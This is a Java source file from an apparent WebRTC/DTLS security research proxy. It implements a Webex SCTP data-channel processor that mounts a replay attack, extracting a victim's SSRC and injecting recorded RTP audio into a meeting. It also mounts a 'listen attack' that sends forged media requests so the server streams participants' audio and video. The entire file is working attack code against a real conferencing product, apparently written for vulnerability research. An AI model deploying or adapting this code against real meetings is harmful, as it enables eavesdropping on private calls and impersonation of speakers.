/*
 * WebRTC-DTLS-Analysis-Proxy
 *
 * Copyright 2022-2025 Technology Innovation Institute (TII), Abu Dhabi
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */
package de.rub.nds.dtlsproxy.probes.rtp.processing.implementation.sctp.webex;

import de.rub.nds.dtlsproxy.probes.rtp.processing.Processor;
import de.rub.nds.dtlsproxy.probes.rtp.processing.implementation.sctp.*;
import de.rub.nds.dtlsproxy.util.RtpReplayThread;
import java.io.IOException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/** Sends an SCTP INIT to the receiving party through an encrypted channel */
public class WebexSctpProcessor extends DataChannelCreationProcessor {

    private static final Logger LOGGER = LogManager.getLogger();

    private RtpReplayThread replayThread;
    private Processor replayChainStart;
    private boolean replayMode;
    private String replayFile;
    private boolean mediaRequestReceived = false;
    private boolean allSourceAdsReceived = false;

    public WebexSctpProcessor(Processor replayChainStart, String replayFile) {
        this.replayChainStart = replayChainStart;
        this.replayMode = replayFile != null;
        this.replayFile = replayFile;
        LOGGER.trace("Webex Processor is in replayMode = {}", replayMode);
    }

    @Override
    protected void processOnChannelSetup(byte[] sctpPacket) throws IOException {
        // announce media sources
        sendWebexSourceAnnoucements();
    }

    @Override
    protected void processPostHandshake(byte[] sctpPacket) throws IOException {

        if (MultistreamUtil.isMultistreamAudioMediaRequest(sctpPacket)) {
            // media request found. acknowledge
            sendMediaRequestAcknowledgment(sctpPacket);
            if (!this.mediaRequestReceived && this.replayMode) {
                // start replay attack: extract ssrc and replay rtp
                initiateReplay(sctpPacket);
            }
            this.mediaRequestReceived = true;
        } else if (MultistreamUtil.isMultistreamVideoMediaRequest(sctpPacket)) {
            // not a request we are looking for, but still acknowledge
            sendMediaRequestAcknowledgment(sctpPacket);
        } else if (MultistreamUtil.isMultistreamSourceAdvertisement(sctpPacket)) {
            // acknowledge, also if all source ads received and listen mode then send media requests
            sendSourceAdvertisementAcknowledgment(sctpPacket);

            // assume video slides advertisement is always send last
            if (!this.allSourceAdsReceived
                    && MultistreamUtil.isMultistreamVideoSlidesSourceAdvertisement(sctpPacket)) {
                this.allSourceAdsReceived = true;
                LOGGER.trace("Assume all media server source advertisements have been received");
                // trigger listen attack if not in replay mode
                if (!this.replayMode) {
                    sendBogusMediaRequests();
                }
            }
        }
    }

    /**
     * Sends source announcements and starts the rtp replay in a separate thread
     *
     * @param sctpPacket
     * @throws IOException
     */
    private void initiateReplay(byte[] sctpPacket) throws IOException {
        long victimSsrc = DataChannelUtil.extractFirstSsrc(sctpPacket);
        replayThread = new RtpReplayThread(replayFile, replayChainStart, victimSsrc);
        replayThread.start();
        sendWebexAudioSourceAnnoucementActiveSource();
    }

    /**
     * Sends media requests as a browser would. Uses random SSRCs
     *
     * @throws IOException
     */
    private void sendBogusMediaRequests() throws IOException {
        RtcChannel channel = getChannel();

        String[] audioMainSsrcs =
                new String[] {
                    DataChannelUtil.createUInt32String(),
                    DataChannelUtil.createUInt32String(),
                    DataChannelUtil.createUInt32String()
                };
        String audioSlidesSsrc = DataChannelUtil.createUInt32String();

        LOGGER.info(
                "Crafting and sending media requests with SSRCs - AUDIO-MAIN: {}, {}, {} AUDIO-SLIDES: {}",
                audioMainSsrcs[0],
                audioMainSsrcs[1],
                audioMainSsrcs[2],
                audioSlidesSsrc);

        String audioMainRequest = MultistreamMessageLibrary.MEDIA_REQUEST_AUDIO_MAIN;
        audioMainRequest = audioMainRequest.replaceAll("XXSSRC1XX", audioMainSsrcs[0]);
        audioMainRequest = audioMainRequest.replaceAll("XXSSRC2XX", audioMainSsrcs[1]);
        audioMainRequest = audioMainRequest.replaceAll("XXSSRC3XX", audioMainSsrcs[2]);
        String audioSlidesRequest = MultistreamMessageLibrary.MEDIA_REQUEST_AUDIO_SLIDES;
        audioSlidesRequest = audioSlidesRequest.replaceAll("XXSSRC1XX", audioSlidesSsrc);

        LOGGER.trace("Sending audio main request: {}", audioMainRequest);
        LOGGER.trace("Sending audio slides request: {}", audioSlidesRequest);
        LOGGER.trace(
                "Sending video main request: {}",
                MultistreamMessageLibrary.MEDIA_REQUEST_VIDEO_MAIN);
        LOGGER.trace(
                "Sending video slides request: {}",
                MultistreamMessageLibrary.MEDIA_REQUEST_VIDEO_SLIDES);

        byte[] sctpAudioMainRequest =
                DataChannelUtil.createWebRtcStringDataPacket(audioMainRequest, channel);
        byte[] sctpAudioSlidesRequest =
                DataChannelUtil.createWebRtcStringDataPacket(audioSlidesRequest, channel);
        byte[] sctpVideoMainRequest =
                DataChannelUtil.createWebRtcStringDataPacket(
                        MultistreamMessageLibrary.MEDIA_REQUEST_VIDEO_MAIN, channel);
        byte[] sctpVideoSlidesRequest =
                DataChannelUtil.createWebRtcStringDataPacket(
                        MultistreamMessageLibrary.MEDIA_REQUEST_VIDEO_SLIDES, channel);

        // bon voyage - lets hope for some rtp in return
        send(sctpAudioMainRequest);
        send(sctpAudioSlidesRequest);
        send(sctpVideoMainRequest);
        send(sctpVideoSlidesRequest);
    }

    /**
     * Sends source announcements as a browser would
     *
     * @throws IOException
     */
    private void sendWebexSourceAnnoucements() throws IOException {
        RtcChannel channel = getChannel();
        byte[] sctpAudioMain =
                DataChannelUtil.createWebRtcStringDataPacket(
                        MultistreamMessageLibrary.SOURCE_ADVERTISEMENT_AUDIO_MAIN, channel);
        send(sctpAudioMain);
        byte[] sctpVideoMain =
                DataChannelUtil.createWebRtcStringDataPacket(
                        MultistreamMessageLibrary.SOURCE_ADVERTISEMENT_VIDEO_MAIN, channel);
        send(sctpVideoMain);
        byte[] sctpAudioSlides =
                DataChannelUtil.createWebRtcStringDataPacket(
                        MultistreamMessageLibrary.SOURCE_ADVERTISEMENT_AUDIO_SLIDES, channel);
        send(sctpAudioSlides);
        try {
            Thread.sleep(8);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
        byte[] sctpVideoSlides =
                DataChannelUtil.createWebRtcStringDataPacket(
                        MultistreamMessageLibrary.SOURCE_ADVERTISEMENT_VIDEO_SLIDES, channel);
        send(sctpVideoSlides);
        byte[] sctpAudioMainActive =
                DataChannelUtil.createWebRtcStringDataPacket(
                        MultistreamMessageLibrary.SOURCE_ADVERTISEMENT_AUDIO_MAIN_ACTIVE, channel);
        send(sctpAudioMainActive);
        try {
            Thread.sleep(8);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
        if (!this.replayMode) { // listen mode will send own media requests
            byte[] sctpRequestVideoMain =
                    DataChannelUtil.createWebRtcStringDataPacket(
                            MultistreamMessageLibrary.MEDIA_REQUEST_VIDEO_MAIN, channel);
            send(sctpRequestVideoMain);
            byte[] sctpRequestVideoSlides =
                    DataChannelUtil.createWebRtcStringDataPacket(
                            MultistreamMessageLibrary.MEDIA_REQUEST_VIDEO_MAIN.replaceAll(
                                    "MAIN", "SLIDES"),
                            channel);
            send(sctpRequestVideoSlides);
            try {
                Thread.sleep(10);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
        byte[] sctpAudioMain3 =
                DataChannelUtil.createWebRtcStringDataPacket(
                        MultistreamMessageLibrary.SOURCE_ADVERTISEMENT_AUDIO_MAIN_3, channel);
        send(sctpAudioMain3);
    }

    /**
     * Sends a source announcement for an active audio main source
     *
     * @throws IOException
     */
    private void sendWebexAudioSourceAnnoucementActiveSource() throws IOException {
        RtcChannel channel = getChannel();
        try {
            Thread.sleep(50);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
        byte[] sctpAudioMain =
                DataChannelUtil.createWebRtcStringDataPacket(
                        MultistreamMessageLibrary.SOURCE_ADVERTISEMENT_AUDIO_MAIN_4, channel);
        send(sctpAudioMain);
    }

    /**
     * Creates and sends an acknowledgement for a given media request sctp message
     *
     * @param sctpWebexMediaRequest
     * @throws IOException
     */
    private void sendMediaRequestAcknowledgment(byte[] sctpWebexMediaRequest) throws IOException {
        String webexRequestString = DataChannelUtil.extractChannelText(sctpWebexMediaRequest);
        String ackString =
                MultistreamUtil.createMultistreamMediaRequestAcknowledgment(webexRequestString);
        byte[] sctpAcknowledgment =
                DataChannelUtil.createWebRtcStringDataPacket(ackString, getChannel());
        send(sctpAcknowledgment);
    }

    /**
     * Creates and sends an acknowledgement for a given source advertisement sctp message
     *
     * @param sctpWebexSourceAdvertisement
     * @throws IOException
     */
    private void sendSourceAdvertisementAcknowledgment(byte[] sctpWebexSourceAdvertisement)
            throws IOException {
        String webexRequestString =
                DataChannelUtil.extractChannelText(sctpWebexSourceAdvertisement);
        String ackString =
                MultistreamUtil.createMultistreamSourceAdvertisementAcknowledgment(
                        webexRequestString);
        byte[] sctpAcknowledgment =
                DataChannelUtil.createWebRtcStringDataPacket(ackString, getChannel());
        send(sctpAcknowledgment);
    }
}
